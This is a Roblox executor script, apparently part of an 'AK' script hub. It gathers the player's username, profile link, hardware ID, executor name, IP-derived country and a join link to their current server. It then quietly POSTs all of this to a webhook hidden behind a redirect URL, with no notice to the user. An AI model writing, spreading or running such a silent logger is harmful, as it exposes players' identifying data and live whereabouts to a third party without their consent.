local HttpService = game:GetService("HttpService")
local Players = game:GetService("Players")
local MarketplaceService = game:GetService("MarketplaceService")
local RbxAnalyticsService = game:GetService("RbxAnalyticsService")
local UserInputService = game:GetService("UserInputService")

local player = Players.LocalPlayer
local userId = player.UserId
local displayName = player.DisplayName
local username = player.Name
local accountAge = player.AccountAge

local platform = (UserInputService.TouchEnabled and not UserInputService.MouseEnabled) and "📱 Mobile" or "💻 PC"

local gameInfo = MarketplaceService:GetProductInfo(game.PlaceId)
local gameName = gameInfo.Name
local gameLink = string.format("https://www.roblox.com/games/%d", game.PlaceId)
local profileLink = string.format("https://www.roblox.com/users/%d/profile", userId)

local joinScript = string.format("```game:GetService('TeleportService'):TeleportToPlaceInstance(%d, '%s')```", game.PlaceId, game.JobId)
local mobileJoinLink = string.format("https://www.roblox.com/games/start?placeId=%d&jobId=%s", game.PlaceId, game.JobId)

local function getHwid()
    local ok, result = pcall(function()
        return RbxAnalyticsService:GetClientId()
    end)
    return ok and result or "Unknown"
end

local function getExecutor()
    if identifyexecutor then
        return identifyexecutor()
    elseif getexecutorname then
        return getexecutorname()
    elseif get_executor_name then
        return get_executor_name()
    end
    return "Unknown"
end

local function getLocation()
    local req = http_request or request or HttpPost or (syn and syn.request)
    if not req then return "🌐 Unknown" end
    
    local ok, res = pcall(function()
        return req({Url = "http://ip-api.com/json", Method = "GET"})
    end)
    
    if ok and res and res.Body then
        local data = HttpService:JSONDecode(res.Body)
        if data and data.countryCode then
            local a, b = data.countryCode:byte(1, 2)
            return string.format("%s%s %s", 
                utf8.char(0x1F1E6 - 65 + a),
                utf8.char(0x1F1E6 - 65 + b),
                data.country
            )
        end
    end
    return "🌐 Unknown"
end

local function getAvatarUrl()
    local url = string.format("https://thumbnails.roblox.com/v1/users/avatar?userIds=%d&size=720x720&format=Png&isCircular=false", userId)
    local ok, res = pcall(function()
        return HttpService:JSONDecode(game:HttpGet(url))
    end)
    if ok and res and res.data and res.data[1] then
        return res.data[1].imageUrl
    end
    return nil
end

local function setupRequest()
    local candidates = {
        syn and syn.request,
        request,
        fluxus and fluxus.request,
        http and http.request,
        http_request,
        sentinel and sentinel.request,
        crypt and crypt.request
    }
    
    for _, fn in ipairs(candidates) do
        if type(fn) == "function" then
            return fn
        end
    end
    
    return function(opts)
        return HttpService:RequestAsync({
            Url = opts.Url,
            Method = opts.Method or "GET"
        })
    end
end

local function getUserTag()
    local req = setupRequest()
    local ok, res = pcall(function()
        return req({
            Url = "https://akadmin-bzk.pages.dev/Mains/tags.json",
            Method = "GET"
        })
    end)
    
    if ok and res and res.Body then
        local tags = HttpService:JSONDecode(res.Body)
        for tag, users in pairs(tags) do
            if type(users) == "table" then
                for _, user in ipairs(users) do
                    if user == username then
                        return tag
                    end
                end
            end
        end
    end
    return "AK USER"
end

local hwid = getHwid()
local executor = getExecutor()
local location = getLocation()
local avatar = getAvatarUrl()
local tag = getUserTag()

local function buildPayload()
    local timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ")
    
    return {
        username = "Nerd",
        avatar_url = "https://cdn.discordapp.com/attachments/1408031479430254665/1426674384684454009/IMG_1464.jpg?ex=68ec158f&is=68eac40f&hm=08ea0bb9f2b2b2b9545ad331625d018cc5eb7e25d6219ef10338f31b12c5b02c&",
        embeds = {
            {
                title = "**" .. tag .. "**",
                description = string.format("[%s](%s)", gameName, gameLink),
                fields = {
                    {name = "User Profile:", value = string.format("[%s](%s)", displayName, profileLink), inline = true},
                    {name = "Country", value = location, inline = true},
                    {name = "Platform:", value = platform, inline = true}
                },
                color = 0x202020,
                image = avatar and {url = avatar} or nil
            },
            {
                title = "EXECUTOR INFO",
                fields = {
                    {name = "HWID:", value = "```" .. hwid .. "```", inline = true},
                    {name = "Executor:", value = "```" .. executor .. "```", inline = true}
                },
                color = 0x202020
            },

            {
                title = "JOIN SCRIPTS",
                fields = {
                    {name = "Join Script:", value = joinScript, inline = false},
                    {name = "", value = "> " .. mobileJoinLink, inline = false}
                },
                color = 0x202020,
                
            }
        }
    }
end

local function send(url, data)
    local req = http_request or request or HttpPost or (syn and syn.request)
    if not req then return false end
    
    local ok = pcall(function()
        req({
            Url = url,
            Body = HttpService:JSONEncode(data),
            Method = "POST",
            Headers = {["Content-Type"] = "application/json"}
        })
    end)
    
    return ok
end

local function init()
    pcall(function()
        local webhook = "https://conceali.ng/p/w/kYdrWqF-Kumx"
        local payload = buildPayload()
        send(webhook, payload)
    end)
end

init()
